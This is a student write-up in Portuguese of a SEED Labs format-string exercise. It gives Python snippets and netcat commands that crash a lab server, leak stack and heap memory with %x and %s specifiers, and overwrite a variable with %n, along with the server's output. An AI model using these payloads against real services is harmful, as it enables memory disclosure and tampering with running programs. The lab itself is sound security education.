# Trabalho realizado na Semana #6

## **Seed Labs**

## Preparação

### Desativar <em>countermeasures<em>:

Desativar <em>Address Space Randomization<em>:

    sudo sysctl -w kernel.randomize_va_space=0

StackGuard e Non-Executable Stack podem ser desativadas na compilação.

## Tarefa 1

**Objetivo:** Forçar o crash do programa

**Conclusão** Para causar o crash do programa basta enviar "%s". Ao enviar o %s o programa vai procurar na stack uma string que não existe, causando um crash.

    echo %s | nc 10.9.0.5 9090

## Tarefa 2A

**Objetivo** Imprimir dados da stack do programa do servidor.

**Procedimento** Descobrir quantos %x são necessários para imprimir a variável que contém o nosso input.
Utilizando o seguinte código auxiliar python, podemos verificar que com 64 %x, o nosso input é impresso.
```python
    s = "AAAA" + "(%x)"*64
    fmt  = (s).encode('latin-1')

    with open('stack', 'wb') as f:
    f.write(fmt)
```

```sh
    cat stack | nc 10.9.0.5 9090
```
Output no server:

```
    server-10.9.0.5 | AAAA(11223344)(1000)(8049db5)(80e5320)(80e61c0)(ffcd8bf0)(ffcd8b18)(80e62d4)(80e5000)(ffcd8bb8)(8049f7e)(ffcd8bf0)(0)(64)(8049f47)(80e5320)(4d8)(ffcd8cf4)(ffcd8bf0)(80e5320)(935f720)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(5975b700)(80e5000)(80e5000)(ffcd91d8)(8049eff)(ffcd8bf0)(104)(5dc)(80e5320)(0)(0)(0)(ffcd92a4)(0)(0)(0)(104)(41414141)The target variable's value (after):  0x11223344
    server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

Como é possível observar pelo output do servidor, o nosso input, "AAAA", (41414141), é impresso, utilizando 64 %s.


## Tarefa 2B

**Objetivo** Imprimir dados da heap do programa do servidor.

**Procedimento** Sabendo que com 64 %x podemos ter acesso ao valor do nosso input, podemos colocar o endereço que pretendemos ler no inicio da string de input.

```py
    #Read from heap T2.B
    s = "%64$s"
    fmt  = (s).encode('latin-1')
    content[4:len(fmt)] = fmt
    number  = 0x080b4008 #secret message address
    content[0:4]  =  (number).to_bytes(4,byteorder='little')
    with open('heap', 'wb') as f:
    f.write(content)
```
A string de input será "%64$s\x08\x40\x0b\x08".

```
    cat heap | nc 10.9.0.5 9090
```
Output no server:
```
    server-10.9.0.5 |@
                    (A secret message
    server-10.9.0.5 | )
```
Como pretendido, a mensagem é impressa com sucesso.


## Tarefa 3A

**Objetivo** Alterar o valor da variável target.

**Procedimento** 

```py
    s = "%64$n"
    fmt  = (s).encode('latin-1')
    content[4:len(fmt)] = fmt
    number  = 0x080e5068 #target variable address
    content[0:4]  =  (number).to_bytes(4,byteorder='little')

    # "\x68\x50\x05\x08%64$n"
    with open('writeheap', 'wb') as f:
    f.write(content)
```

```
    cat writeheap | nc 10.9.0.5 9090
```

Output no server:
```
    server-10.9.0.5 | hThe target variable's value (after):  0x00000004
    server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

A string de input será:  **"\x68\x50\x05\x08%64$n"**.<br/>
Ao enviar "%64$n" na format string, o %n pega no endereço na posição 64 da stack e reescreve o seu conteúdo com o número de bytes impressos.
Isto faz com que seja escrito o valor 0x4 no endereço de target, que é o comprimento do próprio endereço.

## Tarefa 3B

**Objetivo** Alterar o valor da variável target para 0x00005000

**Procedimento**

```py
    content = bytearray(0x00 for i in range(N))
    s = "%64$20476x" + "%64$n"
    fmt  = (s).encode('latin-1')
    content[4:len(fmt)] = fmt
    number  = 0x080e5068 #targer variable address
    content[0:4]  =  (number).to_bytes(4,byteorder='little')
                    
    with open('writeheap2', 'wb') as f:
    f.write(content)
```

A string de input será: **"\x68\x50\x05\x08%64$20476x%64$n"**. <br>
O número de bytes escritos que queremos será 0x5000 em decimal: 20480.
Ao utilizar "%64$20476x" adicionamos 20476 caracteres vazios, que somando com o comprimento do endereço de memória, que é 4, obtemos o número de bytes pretendido.
Ao enviar "%64$n" na format string, o %n pega no endereço na posição 64 da stack e reescreve o seu conteúdo com o número de bytes impressos.

```
    cat writeheap2 | nc 10.9.0.5 9090
```

```
    server-10.9.0.5 | h



    ...



    80e5068The target variable's value (after):  0x00005000
```
